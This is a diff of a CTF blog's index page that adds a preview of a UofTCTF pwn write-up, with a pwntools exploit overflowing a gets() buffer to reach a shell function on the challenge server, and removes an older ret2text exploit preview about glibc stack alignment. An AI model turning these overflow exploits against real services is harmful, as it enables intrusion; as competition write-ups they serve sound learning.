@@ -126,6 +126,92 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/01/18/uoftctf-pwn-wp/" >uoftctf_pwn_wp</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-01-18  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="basic-overflow"><a href="#basic-overflow" class="headerlink" title="basic-overflow"></a>basic-overflow</h2><img src="/2024/01/18/uoftctf-pwn-wp/1705238793380.png" class width="1705238793380">
+
+<p>有一个shell函数，栈溢出覆盖返回地址为shell</p>
+<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  char v4[64]; &#x2F;&#x2F; [rsp+0h] [rbp-40h] BYREF
+
+  gets(v4, argv, envp);
+  return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">int shell()
+&#123;
+  return execve(&quot;&#x2F;bin&#x2F;sh&quot;, 0LL, 0LL);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./basic-overflow'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+is_debug <span class="token operator">=</span> <span class="token number">0</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    ip <span class="token operator">=</span> <span class="token string">"34.123.15.202"</span>
+    port <span class="token operator">=</span> <span class="token number">5000</span>
+    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
+
+<span class="token comment"># gdb.attach(p)</span>
+g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+
+<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
+s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
+sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
+
+<span class="token comment"># recv() recvline() recvuntil()</span>
+r <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+
+r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x40</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401136</span><span class="token punctuation">)</span>
+
+sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="baby-shellcode"><a href="#baby-shellcode" class="headerlink" title="baby-shellcode"></a>baby-shellcode</h2><img src="/2024/01/18/uoftctf-pwn-wp/1705238881991.png" class width="1705238881991">
+	
+	</div>
+  <a type="button" href="/2024/01/18/uoftctf-pwn-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/01/04/pwnable-kr/" >pwnable.kr</a>
 		</h3>
 		</div>
@@ -827,60 +913,6 @@ sub_401020(v4, Arglist[0]);<span aria-hidden="true" class="line-numbers-rows"><s
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/09/26/exp本地不通远程通的问题/" >exp本地不通远程通的问题</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-09-26  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>今天看一个ret2text的题目的时候，遇到了exp本地不通，远程通的奇怪问题，题目是这样的</p>
-<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663341172.png" class title="uTools_1695663341172">
-
-<p>有个backdoor函数是这样的</p>
-<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663362912.png" class title="uTools_1695663362912">
-
-<p>exp是这样的</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token comment"># p=remote("1.container.jingsai.apicon.cn",30509)</span>
-elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Intruduce'</span><span class="token punctuation">)</span>
-p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
-context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
-backd00r<span class="token operator">=</span><span class="token number">0x4011B6</span>
-payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>backd00r<span class="token punctuation">)</span>
-s<span class="token operator">=</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-char<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>gdb调试了一下发现在call system的时候卡在了这个xmm寄存器里</p>
-<img src="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/uTools_1695663133026.png" class title="uTools_1695663133026">
-
-<p>搜索了一下，在这里找到了解决方法 <a target="_blank" rel="noopener" href="https://blog.csdn.net/fjh1997/article/details/107695261">https://blog.csdn.net/fjh1997/article/details/107695261</a></p>
-<p>发现是glibc &gt;&#x3D; 2.27的时候 system函数里面会调用xmm寄存器，xmm寄存器要求16字节对齐，远程的环境应该是&lt;2.27的所以可以直接打通，然后我本地的glibc版本是2.35的，所以会因为xmm寄存器内存对齐的原因导致exp打不通，只需要少push一个地址，内存就对齐了</p>
-	
-	</div>
-  <a type="button" href="/2023/09/26/exp本地不通远程通的问题/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -934,7 +966,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 		
 			<li><a href="/categories/misc/">misc<span>1</span></a></li>
 		
-			<li><a href="/categories/ysyx/">ysyx<span>2</span></a></li>
+			<li><a href="/categories/ysyx/">ysyx<span>3</span></a></li>
 		
 			<li><a href="/categories/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
 		
@@ -947,45 +979,45 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/vm-pwn/">vm pwn<span>2</span></a></li>
-		
 			<li><a href="/tags/fmt/">fmt<span>7</span></a></li>
-		
-			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
-		
-			<li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li>
-		
-			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
-		
-			<li><a href="/tags/shellcode/">shellcode<span>5</span></a></li>
-		
-			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/heap/">heap<span>13</span></a></li>
-		
-			<li><a href="/tags/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
-		
-			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
-		
-			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/ysyx/">ysyx<span>2</span></a></li>
-		
-			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
 		
 			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
 		
+			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li>
+		
 			<li><a href="/tags/riscv-pwn/">riscv pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/数电/">数电<span>3</span></a></li>
 		
 			<li><a href="/tags/tls/">tls<span>1</span></a></li>
 		
+			<li><a href="/tags/iot/">iot<span>1</span></a></li>
+		
+			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
+		
+			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
+		
 			<li><a href="/tags/misc/">misc<span>1</span></a></li>
+		
+			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
+		
+			<li><a href="/tags/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
+		
+			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
+		
+			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
+		
+			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/rust/">rust<span>1</span></a></li>
+		
+			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
+		
+			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>26</span></a></li>
@@ -1001,6 +1033,10 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2025/10/05/图灵完备1/" ><i class="fa fa-file-o"></i>图灵完备1</a>
+      </li>
+    
+      <li>
         <a href="/2025/10/04/ysyx-f4计算机系统的状态机模型/" ><i class="fa fa-file-o"></i>ysyx_f4计算机系统的状态机模型</a>
       </li>
     
@@ -1014,10 +1050,6 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     
       <li>
         <a href="/2025/08/25/nssctf4th_pwn/" ><i class="fa fa-file-o"></i>nssctf4th_pwn</a>
-      </li>
-    
-      <li>
-        <a href="/2025/06/18/SmileyCTF/" ><i class="fa fa-file-o"></i>SmileyCTF</a>
       </li>
     
   </ul>
